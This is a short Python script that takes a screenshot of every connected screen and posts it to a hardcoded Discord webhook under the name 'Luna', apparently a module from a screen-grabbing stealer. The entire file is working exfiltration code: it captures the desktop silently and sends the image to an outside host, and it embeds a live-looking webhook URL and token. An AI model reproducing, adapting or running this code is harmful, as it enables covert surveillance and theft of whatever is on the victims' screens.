import os
import json
import tempfile
import requests
import logging
from PIL import ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Function to take a screenshot and save it
def take_screenshot():
    try:
        temp_path = tempfile.gettempdir()  # Save the screenshot in the temporary directory
        screenshot_path = os.path.join(temp_path, "desktopshot.png")
        
        # Take a screenshot using ImageGrab (only available on Windows and macOS)
        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        
        # Save the image as desktopshot.png
        image.save(screenshot_path)
        image.close()
        logging.info(f"chwya 7jet o5ra ttsab")
        return screenshot_path
    except Exception as e:
        logging.error(f"Failed to take screenshot: {e}")
        raise

# Function to send the screenshot to a Discord webhook
def send_screenshot(screenshot_path):
    try:
        if not os.path.exists(screenshot_path):
            raise FileNotFoundError(f"Screenshot not found at {screenshot_path}")
        
        # Prepare the Discord webhook payload
        webhook_data = {
            "username": "Luna",
            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
            "embeds": [
                {
                    "color": 5639644,
                    "title": "Desktop Screenshot",
                    "image": {
                        "url": "attachment://image.png"
                    }
                }
            ]
        }

        # Open the screenshot file and prepare the multipart encoder
        with open(screenshot_path, "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder({
                'payload_json': json.dumps(webhook_data),  # The JSON data
                'file': ('image.png', image_data, 'image/png')  # The image file
            })
        
        # Send the POST request to the provided webhook URL
        webhook_url = "https://discord.com/api/webhooks/1205108171769905202/-nPkymxlUmsdjFWCRXHDpjWO6opbKHQ8aHaevZFju-5xxswy5yReNuJSLQdLpnK7aKki"
        response = requests.post(webhook_url, headers={'Content-type': encoder.content_type}, data=encoder)
        
        if response.status_code == 204:
            logging.info("Screenshot sent successfully to Discord.")
        else:
            logging.error(f"thama prob stana")
    
    except Exception as e:
        logging.error(f"Failed to send screenshot: {e}")
        raise

# Main function to execute the entire process
def main():
    logging.basicConfig(level=logging.INFO)  # Set logging level to INFO
    try:
        # Take screenshot and get the path
        screenshot_path = take_screenshot()

        # Send screenshot to Discord webhook
        send_screenshot(screenshot_path)
    except Exception as e:
        logging.error(f"An error occurred during the process: {e}")

# Entry point of the script
if __name__ == "__main__":
    main()
